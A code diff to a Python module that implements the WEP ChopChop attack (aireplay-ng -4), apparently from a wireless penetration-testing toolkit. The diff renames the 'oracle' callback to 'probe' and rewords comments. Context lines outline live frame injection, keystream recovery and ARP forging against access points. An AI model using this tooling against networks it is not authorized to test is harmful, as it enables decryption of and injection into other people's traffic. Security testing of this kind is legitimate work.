@@ -1,6 +1,6 @@
 """WEP ChopChop attack (`aireplay-ng -4`) — M6.
 
-Decrypts a captured frame byte-by-byte using the AP as an ICV oracle, no key:
+Decrypts a captured frame byte-by-byte using the AP's ICV check, no key:
 chop the last byte, guess its plaintext (≤256), fix the ICV
 (dot11.wep.crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to a data
 frame from us, send. The AP relays the shortened frame IFF the guess was right.
@@ -86,8 +86,8 @@ _CHOP_FLOOR = 8
 # genuinely-unknown IP fields (id / flags / TTL / …) we can't derive, so an IP
 # seed is usable only when the AP relays down to a <=12-byte cipher.
 _IP_MAX_WALL = 12
-# Sentinel "guess" — not a byte value (0..255), but a flag the oracle returns
-# when the AP relayed a deliberately-bad-ICV frame (→ AP isn't vulnerable).
+# Sentinel "guess": not a byte value (0..255) but a flag meaning the AP relayed a
+# deliberately-bad-ICV frame (→ AP isn't vulnerable).
 _SENTINEL = 256
 
 
@@ -111,7 +111,7 @@ def _hdr_len(fc0: int, fc1: int) -> int:
 
 
 class WepChopChop:
-    """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
+    """ChopChop daemon: chop a captured ARP byte-by-byte against the AP's relay →
     recover keystream → forge a broadcast ARP → hand to replay."""
 
     _SEND_INTERVAL_S = 0.003  # Rolling-send spacing
@@ -136,7 +136,7 @@ class WepChopChop:
         log_callback: Optional[Callable[[str], None]] = None,
         sender_ip: bytes = bytes([192, 168, 1, 123]),
         target_ip: bytes = bytes([192, 168, 1, 1]),
-        oracle: Optional[Callable[[bytes], Awaitable[Optional[int]]]] = None,
+        probe: Optional[Callable[[bytes], Awaitable[Optional[int]]]] = None,
     ):
         self.iface = iface
         self.target = target
@@ -151,11 +151,10 @@ class WepChopChop:
         self._log = log_callback or (lambda _m: None)
         self._sender_ip = sender_ip
         self._target_ip = target_ip
-        # The oracle is injectable so the byte-walk is unit-testable offline:
-        # oracle(body) -> the accepted guess for chopping body's last byte (or
-        # _SENTINEL if the AP relays bad ICV, or None if no relay). Default =
-        # the live AP (tag-and-read-back over USB).
-        self._oracle = oracle or self._hw_oracle
+        # Injectable so the byte-walk is unit-testable offline: probe(body) ->
+        # the accepted guess for body's last byte (_SENTINEL if the AP relays
+        # bad ICV, None if no relay). Default: probe the live AP over USB.
+        self._probe = probe or self._hw_probe
 
         self.state = "idle"        # idle|waiting-auth|seeding|chopping|success
         self._active = False
@@ -248,7 +247,7 @@ class WepChopChop:
         while self._active and len(body) > _CHOP_FLOOR:
             self._bytes_done = max(self._bytes_done, full_len - len(body))
             self._maybe_heartbeat()
-            guess = await self._oracle(body)
+            guess = await self._probe(body)
             if guess == _SENTINEL:
                 self._log(treelog.leaf_fail(
                     "[red]AP forwards bad-ICV frames[/red] [dim](not vulnerable "
@@ -268,7 +267,7 @@ class WepChopChop:
             return None
         return self._forge_arp(ks)
 
-    # ---- Live-AP oracle: tag the guess, read it back from the relay ---------
+    # ---- Live-AP probe: tag the guess, read it back from the relay ----------
 
     def _tagged_da(self, guess: int) -> bytes:
         """Destination MAC carrying the guess (aireplay's trick): FF (multicast,
@@ -326,7 +325,7 @@ class WepChopChop:
                 return self._relayed_guess
         return None
 
-    async def _hw_oracle(self, body: bytes) -> Optional[int]:
+    async def _hw_probe(self, body: bytes) -> Optional[int]:
         """Chop ``body``'s last byte against the live AP: the candidate for
         guess g is the chopped+ICV-fixed frame (the sentinel is the truncated
         frame WITHOUT the fixup → bad ICV)."""
